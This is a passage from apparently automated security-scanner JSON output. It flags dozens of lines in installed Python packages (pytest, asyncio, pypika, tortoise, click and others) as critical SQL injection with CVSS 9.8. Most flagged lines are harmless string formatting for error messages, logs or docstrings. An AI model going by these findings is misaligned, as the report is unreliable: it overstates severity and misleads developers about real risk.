            "context": "        prewhere_sql = ctx.copy(subquery=True)\n        prewheres = cast(QueryBuilder, self._prewheres)\n        return \" PREWHERE {prewhere}\".format(prewhere=prewheres.get_sql(prewhere_sql))\n\n    def _where_sql(self, ctx: SqlContext) -> str:",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/queries.py",
            "line": 1651,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return \" WHERE {where}\".format(where=wheres.get_sql(where_ctx))",
            "context": "        where_ctx = ctx.copy(subquery=True)\n        wheres = cast(QueryBuilder, self._wheres)\n        return \" WHERE {where}\".format(where=wheres.get_sql(where_ctx))\n\n    def _group_sql(",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/queries.py",
            "line": 1873,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"another from the selected table or an existing join.  Found [{tables}]\".format(",
            "context": "            raise JoinException(\n                \"Invalid join criterion. One field is required from the joined item and \"\n                \"another from the selected table or an existing join.  Found [{tables}]\".format(\n                    tables=\", \".join(map(str, missing_tables))\n                )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/queries.py",
            "line": 2200,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return \" AS ({query})\".format(",
            "context": "\n    def _as_select_sql(self, ctx: SqlContext) -> str:\n        return \" AS ({query})\".format(\n            query=self._as_select.get_sql(ctx),  # type:ignore[union-attr]\n        )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/coverage/sqldata.py",
            "line": 662,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "self._debug.write(\"Updating with data from {!r}\".format(",
            "context": "        \"\"\"\n        if self._debug.should(\"dataop\"):\n            self._debug.write(\"Updating with data from {!r}\".format(\n                getattr(other_data, \"_filename\", \"???\"),\n            ))",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/coverage/report.py",
            "line": 153,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "formats[item].format(str(value).replace(\"_\", \"\\\\_\"), name_len=max_name, n=max_n-1)",
            "context": "            formats.update(dict(Cover=\"{:>{n}}% |\"))\n            line_items = [\n                formats[item].format(str(value).replace(\"_\", \"\\\\_\"), name_len=max_name, n=max_n-1)\n                for item, value in zip(header, values)\n            ]",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/coverage/report.py",
            "line": 168,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "total_line_items += formats[item].format(insert, name_len=max_name, n=max_n)",
            "context": "            else:\n                insert = f\" **{value}**\"\n            total_line_items += formats[item].format(insert, name_len=max_name, n=max_n)\n        self.write_items(total_line_items)\n        for end_line in end_lines:",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/marshmallow/fields.py",
            "line": 296,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "msg = msg.format(**kwargs)",
            "context": "            raise AssertionError(message) from error\n        if isinstance(msg, (str, bytes)):\n            msg = msg.format(**kwargs)\n        return ValidationError(msg)\n",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/scope.py",
            "line": 78,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"{} {}got an unexpected scope value '{}'\".format(",
            "context": "        except ValueError:\n            fail(\n                \"{} {}got an unexpected scope value '{}'\".format(\n                    descr, f\"from {where} \" if where else \"\", scope_name\n                ),",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/reports.py",
            "line": 478,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "assert False, \"Unknown report_type unserialize data: {}\".format(",
            "context": "        elif data[\"$report_type\"] == \"CollectReport\":\n            return CollectReport._from_json(data)\n        assert False, \"Unknown report_type unserialize data: {}\".format(\n            data[\"$report_type\"]\n        )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/main.py",
            "line": 1071,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise UsageError(msg.format(arg=arg))",
            "context": "            else \"directory argument cannot contain :: selection parts: {arg}\"\n        )\n        raise UsageError(msg.format(arg=arg))\n    return CollectionArgument(\n        path=fspath,",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/python.py",
            "line": 515,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"unique basename for your test file modules\".format(*e.args)",
            "context": "            \"  {}\\n\"\n            \"HINT: remove __pycache__ / .pyc files and/or use a \"\n            \"unique basename for your test file modules\".format(*e.args)\n        ) from e\n    except ImportError as e:",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/python.py",
            "line": 972,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "msg = prefix + msg.format(argname, idx)",
            "context": "            prefix = f\"{self.nodeid}: \" if self.nodeid is not None else \"\"\n            msg = \"error raised while trying to determine id of parameter '{}' at position {}\"\n            msg = prefix + msg.format(argname, idx)\n            raise ValueError(msg) from e\n        if id is None:",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/tracemalloc.py",
            "line": 15,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "formatted_tb = \"\\n\".join(tb.format())",
            "context": "    tb = tracemalloc.get_object_traceback(source)\n    if tb is not None:\n        formatted_tb = \"\\n\".join(tb.format())\n        # Use a leading new line to better separate the (large) output\n        # from the traceback to the previous warning text.",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/nodes.py",
            "line": 105,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": ").format(name=f\"{cls.__module__}.{cls.__name__}\")",
            "context": "            \"https://docs.pytest.org/en/stable/deprecations.html#node-construction-changed-to-node-from-parent\"\n            \" for more details.\"\n        ).format(name=f\"{cls.__module__}.{cls.__name__}\")\n        fail(msg, pytrace=False)\n",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/queryset.py",
            "line": 1514,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "f'Selecting relation \"{field}\" is not possible, select concrete '",
            "context": "        if field in self.model._meta.fetch_fields and not forwarded_fields:\n            raise ValueError(\n                f'Selecting relation \"{field}\" is not possible, select concrete '\n                \"field on related model\"\n            )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/queryset.py",
            "line": 1546,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "f'Selecting relation \"{field}\" is not possible, select '",
            "context": "        if field in self.model._meta.fetch_fields:\n            raise ValueError(\n                f'Selecting relation \"{field}\" is not possible, select '\n                \"concrete field on related model\"\n            )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/asyncio/tasks.py",
            "line": 263,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "'in task {!r} with {!r}'.format(self, result)))",
            "context": "                        RuntimeError(\n                            'yield was used instead of yield from '\n                            'in task {!r} with {!r}'.format(self, result)))\n            elif result is None:\n                # Bare yield relinquishes control for one event loop iteration.",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/asyncio/tasks.py",
            "line": 273,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "'generator in task {!r} with {}'.format(",
            "context": "                    RuntimeError(\n                        'yield was used instead of yield from for '\n                        'generator in task {!r} with {}'.format(\n                            self, result)))\n            else:",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/asyncio/unix_events.py",
            "line": 262,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "msg = 'Address {!r} is already in use'.format(path)",
            "context": "                    # Let's improve the error message by adding\n                    # with what exact address it occurs.\n                    msg = 'Address {!r} is already in use'.format(path)\n                    raise OSError(errno.EADDRINUSE, msg) from None\n                else:",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/asyncio/selectors.py",
            "line": 39,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"{!r}\".format(fileobj)) from None",
            "context": "        except (AttributeError, TypeError, ValueError):\n            raise ValueError(\"Invalid file object: \"\n                             \"{!r}\".format(fileobj)) from None\n    if fd < 0:\n        raise ValueError(\"Invalid file descriptor: {}\".format(fd))",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/asyncio/selectors.py",
            "line": 41,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise ValueError(\"Invalid file descriptor: {}\".format(fd))",
            "context": "                             \"{!r}\".format(fileobj)) from None\n    if fd < 0:\n        raise ValueError(\"Invalid file descriptor: {}\".format(fd))\n    return fd\n",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/asyncio/selectors.py",
            "line": 64,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise KeyError(\"{!r} is not registered\".format(fileobj)) from None",
            "context": "            return self._selector._fd_to_key[fd]\n        except KeyError:\n            raise KeyError(\"{!r} is not registered\".format(fileobj)) from None\n\n    def __iter__(self):",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/asyncio/selectors.py",
            "line": 182,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise KeyError(\"{!r} is not registered\".format(fileobj)) from None",
            "context": "            return mapping[fileobj]\n        except KeyError:\n            raise KeyError(\"{!r} is not registered\".format(fileobj)) from None\n\n    @abstractmethod",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/asyncio/selectors.py",
            "line": 226,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise ValueError(\"Invalid events: {!r}\".format(events))",
            "context": "    def register(self, fileobj, events, data=None):\n        if (not events) or (events & ~(EVENT_READ | EVENT_WRITE)):\n            raise ValueError(\"Invalid events: {!r}\".format(events))\n\n        key = SelectorKey(fileobj, self._fileobj_lookup(fileobj), events, data)",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/asyncio/selectors.py",
            "line": 241,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise KeyError(\"{!r} is not registered\".format(fileobj)) from None",
            "context": "            key = self._fd_to_key.pop(self._fileobj_lookup(fileobj))\n        except KeyError:\n            raise KeyError(\"{!r} is not registered\".format(fileobj)) from None\n        return key\n",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/asyncio/selectors.py",
            "line": 249,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise KeyError(\"{!r} is not registered\".format(fileobj)) from None",
            "context": "            key = self._fd_to_key[self._fileobj_lookup(fileobj)]\n        except KeyError:\n            raise KeyError(\"{!r} is not registered\".format(fileobj)) from None\n        if events != key.events:\n            self.unregister(fileobj)",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/idna/core.py",
            "line": 77,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise IDNABidiError(\"Unknown directionality in label {} at position {}\".format(repr(label), idx))",
            "context": "        if direction == \"\":\n            # String likely comes from a newer version of Unicode\n            raise IDNABidiError(\"Unknown directionality in label {} at position {}\".format(repr(label), idx))\n        if direction in [\"R\", \"AL\", \"AN\"]:\n            bidi_label = True",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpx/_multipart.py",
            "line": 26,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "{chr(c): \"%{:02X}\".format(c) for c in range(0x1F + 1) if c != 0x1B}",
            "context": "_HTML5_FORM_ENCODING_REPLACEMENTS = {'\"': \"%22\", \"\\\\\": \"\\\\\\\\\"}\n_HTML5_FORM_ENCODING_REPLACEMENTS.update(\n    {chr(c): \"%{:02X}\".format(c) for c in range(0x1F + 1) if c != 0x1B}\n)\n_HTML5_FORM_ENCODING_RE = re.compile(",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/more_itertools/more.py",
            "line": 1327,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": ">>> func = lambda item: print('Received {}'.format(item))",
            "context": "\n        >>> from more_itertools import consume\n        >>> func = lambda item: print('Received {}'.format(item))\n        >>> consume(side_effect(func, range(2)))\n        Received 0",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/click/types.py",
            "line": 332,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return _(\"Choose from:\\n\\t{choices}\").format(",
            "context": "        .. versionchanged:: 8.2.0 Added ``ctx`` argument.\n        \"\"\"\n        return _(\"Choose from:\\n\\t{choices}\").format(\n            choices=\",\\n\\t\".join(self._normalized_mapping(ctx=ctx).values())\n        )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/click/_termui_impl.py",
            "line": 604,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "_(\"{editor}: Editing failed: {e}\").format(editor=editor, e=e)",
            "context": "        except OSError as e:\n            raise ClickException(\n                _(\"{editor}: Editing failed: {e}\").format(editor=editor, e=e)\n            ) from e\n",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/charset_normalizer/api.py",
            "line": 126,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"Trying to detect encoding from a tiny portion of ({}) byte(s).\".format(",
            "context": "        logger.log(\n            TRACE,\n            \"Trying to detect encoding from a tiny portion of ({}) byte(s).\".format(\n                length\n            ),",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/uvicorn/importer.py",
            "line": 16,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise ImportFromStringError(message.format(import_str=import_str))",
            "context": "    if not module_str or not attrs_str:\n        message = 'Import string \"{import_str}\" must be in format \"<module>:<attribute>\".'\n        raise ImportFromStringError(message.format(import_str=import_str))\n\n    try:",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/uvicorn/importer.py",
            "line": 24,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise ImportFromStringError(message.format(module_str=module_str))",
            "context": "            raise exc from None\n        message = 'Could not import module \"{module_str}\".'\n        raise ImportFromStringError(message.format(module_str=module_str))\n\n    instance = module",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/uvicorn/importer.py",
            "line": 32,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise ImportFromStringError(message.format(attrs_str=attrs_str, module_str=module_str))",
            "context": "    except AttributeError:\n        message = 'Attribute \"{attrs_str}\" not found in module \"{module_str}\".'\n        raise ImportFromStringError(message.format(attrs_str=attrs_str, module_str=module_str))\n\n    return instance",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/rich/progress.py",
            "line": 638,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "_text = self.text_format.format(task=task)",
            "context": "\n    def render(self, task: \"Task\") -> Text:\n        _text = self.text_format.format(task=task)\n        if self.markup:\n            text = Text.from_markup(_text, style=self.style, justify=self.justify)",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/rich/progress.py",
            "line": 764,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "_text = text_format.format(task=task)",
            "context": "            self.text_format_no_percentage if task.total is None else self.text_format\n        )\n        _text = text_format.format(task=task)\n        if self.markup:\n            text = Text.from_markup(_text, style=self.style, justify=self.justify)",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/automat/_core.py",
            "line": 106,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"already have transition from {} to {} via {}\".format(",
            "context": "            if anInState == inState and anInputSymbol == inputSymbol:\n                raise ValueError(\n                    \"already have transition from {} to {} via {}\".format(\n                        inState, anOutState, inputSymbol\n                    )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/aiohttp/helpers.py",
            "line": 852,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"is forbidden\".format(cls.__name__)",
            "context": "        raise TypeError(\n            \"Inheritance class {} from ChainMapProxy \"\n            \"is forbidden\".format(cls.__name__)\n        )\n",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/aiohttp/client.py",
            "line": 424,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"is discouraged\".format(cls.__name__),",
            "context": "        warnings.warn(\n            \"Inheritance class {} from ClientSession \"\n            \"is discouraged\".format(cls.__name__),\n            DeprecationWarning,\n            stacklevel=2,",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/aiohttp/web_app.py",
            "line": 180,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"is discouraged\".format(cls.__name__),",
            "context": "        warnings.warn(\n            \"Inheritance class {} from web.Application \"\n            \"is discouraged\".format(cls.__name__),\n            DeprecationWarning,\n            stacklevel=3,",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/v1/schema.py",
            "line": 131,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": ":param ref_template: Use a ``string.format()`` template for ``$ref`` instead of a prefix. This can be useful",
            "context": "      top-level key ``definitions``, so you can extract them from there. But all the references will have the set\n      prefix.\n    :param ref_template: Use a ``string.format()`` template for ``$ref`` instead of a prefix. This can be useful\n      for references that cannot be represented by ``ref_prefix`` such as a definition stored in another file. For\n      a sibling json file in a ``/schemas`` directory use ``\"/schemas/${model}.json#\"``.",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/v1/schema.py",
            "line": 179,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": ":param ref_template: Use a ``string.format()`` template for ``$ref`` instead of a prefix. This can be useful for",
            "context": "      top-level key ``definitions``, so you can extract them from there. But all the references will have the set\n      prefix.\n    :param ref_template: Use a ``string.format()`` template for ``$ref`` instead of a prefix. This can be useful for\n      references that cannot be represented by ``ref_prefix`` such as a definition stored in another file. For a\n      sibling json file in a ``/schemas`` directory use ``\"/schemas/${model}.json#\"``.",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/dialects/mysql.py",
            "line": 80,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"{field}={value}\".format(",
            "context": "                if value:\n                    updates.append(\n                        \"{field}={value}\".format(\n                            field=field.get_sql(on_conflict_ctx),\n                            value=value.get_sql(on_conflict_ctx),",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/dialects/mysql.py",
            "line": 87,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"{field}={alias}.{value}\".format(",
            "context": "                else:\n                    updates.append(\n                        \"{field}={alias}.{value}\".format(\n                            field=field.get_sql(on_conflict_ctx),\n                            alias=format_quotes(self.alias, ctx.quote_char),",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/dialects/mysql.py",
            "line": 93,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "action_sql = \" ON DUPLICATE KEY UPDATE {updates}\".format(updates=\",\".join(updates))",
            "context": "                        )\n                    )\n            action_sql = \" ON DUPLICATE KEY UPDATE {updates}\".format(updates=\",\".join(updates))\n            return action_sql\n        return \"\"",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/dialects/mysql.py",
            "line": 113,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return \"SELECT {distinct}{modifier}{select}\".format(",
            "context": "        \"\"\"\n        ctx = ctx.copy(with_alias=True, subquery=True)\n        return \"SELECT {distinct}{modifier}{select}\".format(\n            distinct=\"DISTINCT \" if self._distinct else \"\",\n            modifier=\"{} \".format(\" \".join(self._modifiers)) if self._modifiers else \"\",",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/dialects/mysql.py",
            "line": 115,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "modifier=\"{} \".format(\" \".join(self._modifiers)) if self._modifiers else \"\",",
            "context": "        return \"SELECT {distinct}{modifier}{select}\".format(\n            distinct=\"DISTINCT \" if self._distinct else \"\",\n            modifier=\"{} \".format(\" \".join(self._modifiers)) if self._modifiers else \"\",\n            select=\",\".join(term.get_sql(ctx) for term in self._selects),\n        )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/dialects/mysql.py",
            "line": 121,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return \"INSERT {ignore}INTO {table}\".format(",
            "context": "    def _insert_sql(self, ctx: SqlContext) -> str:\n        insert_table = cast(Table, self._insert_table)\n        return \"INSERT {ignore}INTO {table}\".format(\n            table=insert_table.get_sql(ctx),\n            ignore=\"IGNORE \" if self._on_conflict_do_nothing else \"\",",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/dialects/mssql.py",
            "line": 55,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return order_by + \" OFFSET {offset} ROWS\".format(",
            "context": "        if not self._orderbys:\n            order_by = \" ORDER BY (SELECT 0)\"\n        return order_by + \" OFFSET {offset} ROWS\".format(\n            offset=self._offset.get_sql(ctx) if self._offset is not None else 0\n        )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/dialects/mssql.py",
            "line": 84,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return \"TOP ({}) \".format(self._top) if self._top else \"\"",
            "context": "\n    def _top_sql(self) -> str:\n        return \"TOP ({}) \".format(self._top) if self._top else \"\"\n\n    def _select_sql(self, ctx: SqlContext) -> str:",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pypika_tortoise/dialects/mssql.py",
            "line": 88,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return \"SELECT {distinct}{top}{select}\".format(",
            "context": "    def _select_sql(self, ctx: SqlContext) -> str:\n        ctx = ctx.copy(with_alias=True, subquery=True)\n        return \"SELECT {distinct}{top}{select}\".format(\n            top=self._top_sql(),\n            distinct=\"DISTINCT \" if self._distinct else \"\",",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/aiosqlite/tests/perf.py",
            "line": 156,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "await db.execute(\"insert into perf (k) values (%d)\" % (i,))",
            "context": "            await db.execute(\"create table perf (i integer primary key asc, k integer)\")\n            for i in range(100):\n                await db.execute(\"insert into perf (k) values (%d)\" % (i,))\n            await db.commit()\n",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/aiosqlite/tests/perf.py",
            "line": 169,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "await db.execute(\"insert into perf (k) values (%d)\" % (i,))",
            "context": "            await db.execute(\"create table perf (i integer primary key asc, k integer)\")\n            for i in range(100):\n                await db.execute(\"insert into perf (k) values (%d)\" % (i,))\n            await db.commit()\n",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/markdown_it/cli/parse.py",
            "line": 16,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "version_str = \"markdown-it-py [version {}]\".format(__version__)",
            "context": "from markdown_it.main import MarkdownIt\n\nversion_str = \"markdown-it-py [version {}]\".format(__version__)\n\n",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/config/__init__.py",
            "line": 497,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"please remove it from your requirements.\".format(",
            "context": "                PytestConfigWarning(\n                    \"{} plugin has been merged into the core, \"\n                    \"please remove it from your requirements.\".format(\n                        name.replace(\"_\", \"-\")\n                    )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/config/__init__.py",
            "line": 1965,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise UsageError(error_template.format(error=str(e))) from None",
            "context": "        action: warnings._ActionKind = warnings._getaction(action_)  # type: ignore[attr-defined]\n    except warnings._OptionError as e:\n        raise UsageError(error_template.format(error=str(e))) from None\n    try:\n        category: type[Warning] = _resolve_warning_category(category_)",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/config/__init__.py",
            "line": 1971,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise UsageError(error_template.format(error=exception_text)) from None",
            "context": "        exc_info = ExceptionInfo.from_current()\n        exception_text = exc_info.getrepr(style=\"native\")\n        raise UsageError(error_template.format(error=exception_text)) from None\n    if message and escape:\n        message = re.escape(message)",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/config/__init__.py",
            "line": 1983,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "error_template.format(error=f\"invalid lineno {lineno_!r}: {e}\")",
            "context": "        except ValueError as e:\n            raise UsageError(\n                error_template.format(error=f\"invalid lineno {lineno_!r}: {e}\")\n            ) from None\n    else:",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/config/__init__.py",
            "line": 1992,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "error_template.format(error=f\"Invalid regex {e.pattern!r}: {e}\")",
            "context": "    except re.error as e:\n        raise UsageError(\n            error_template.format(error=f\"Invalid regex {e.pattern!r}: {e}\")\n        ) from None\n    return action, message, category, module, lineno",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/backends/base/schema_generator.py",
            "line": 77,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return self.FK_TEMPLATE.format(",
            "context": "        comment: str,\n    ) -> str:\n        return self.FK_TEMPLATE.format(\n            db_column=db_column, table=table, field=field, on_delete=on_delete, comment=comment\n        )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/backends/oracle/schema_generator.py",
            "line": 119,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "fk = self.FK_TEMPLATE.format(",
            "context": "            on_delete = CASCADE\n        constraint = f'CONSTRAINT \"{constraint_name}\" ' if constraint_name else \"\"\n        fk = self.FK_TEMPLATE.format(\n            constraint=constraint,\n            db_column=db_column,",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/backends/oracle/executor.py",
            "line": 21,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "sql = f\"SELECT {seq}.CURRVAL FROM DUAL\"  # nosec:B608",
            "context": "        except IndexError:\n            return\n        sql = f\"SELECT {seq}.CURRVAL FROM DUAL\"  # nosec:B608\n        ret = await db.execute_query_dict(sql)\n        await super()._process_insert_result(instance, ret[0][\"CURRVAL\"])",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/orm/strategy_options.py",
            "line": 2534,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "f\"selectin_polymorphic({path[-2].mapper.class_.__name__}, \"",
            "context": "                    f'\"{path[-2]}'\n                    f'.of_type({parent_entity_str})\" or \"loadopt.options('\n                    f\"selectin_polymorphic({path[-2].mapper.class_.__name__}, \"\n                    f'[{parent_entity_str}]), ...)\" ?'\n                    if not path_is_of_type",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/sql/compiler.py",
            "line": 750,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "message = template.format(",
            "context": "                    f'\"{self.froms[from_]}\"' for from_ in froms\n                )\n                message = template.format(\n                    stmt_type=stmt_type,\n                    froms=froms_str,",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/sql/compiler.py",
            "line": 6105,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "f\" SELECT {colnames_w_cast} FROM \"",
